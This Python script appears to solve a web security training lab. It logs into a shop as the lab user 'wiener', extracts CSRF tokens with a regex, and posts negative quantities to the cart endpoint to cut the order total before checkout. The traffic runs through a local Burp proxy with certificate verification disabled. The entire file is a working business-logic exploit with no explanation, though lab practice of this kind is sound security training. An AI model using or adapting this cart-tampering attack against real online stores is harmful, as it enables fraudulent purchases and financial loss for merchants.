import requests
import re




# Disable certificate warnings
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

session = requests.Session()

# Use Burp proxy if needed
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Take URL input

app_url = input("Enter your url :  ").strip()

# first i need to find the csrf token 

csrf_token = session.get(app_url+"/login",verify=False,proxies=proxies)
match = re.search(r'name="csrf" value="(.*?)"',csrf_token.text).group(1)  # new way to find csrf token 
print(f"csrf /login token",match)

wiener_data = {"username":"wiener","password":"peter","csrf":match}
wiener_session = session.post(app_url+"/login",verify=False,proxies=proxies,data=wiener_data)

data = {"productId":"15","redir":"PRODUCT","quantity":"-10"}
login_session = session.post(app_url+"/cart",verify=False,proxies=proxies,data=data)

data = {"productId":"1","redir":"PRODUCT","quantity":"1"}
login_session = session.post(app_url+"/cart",verify=False,proxies=proxies,data=data)


data = {"productId":"15","redir":"PRODUCT","quantity":"-5"}
login_session = session.post(app_url+"/cart",verify=False,proxies=proxies,data=data)

data = {"productId":"15","quantity":"2","redir":"CART"}
login_session1 = session.post(app_url+"/cart",verify=False,proxies=proxies,data=data)

csrf_token1 = session.get(app_url+"/cart",verify=False,proxies=proxies)
match1 = re.search(r'name="csrf" value="(.*?)"',csrf_token1.text).group(1)  # new way to find csrf token 
print(f"csrf2 /cart token",match1)

login_session2 = session.post(app_url+"/cart/checkout",verify=False,proxies=proxies,data={"csrf":match1})



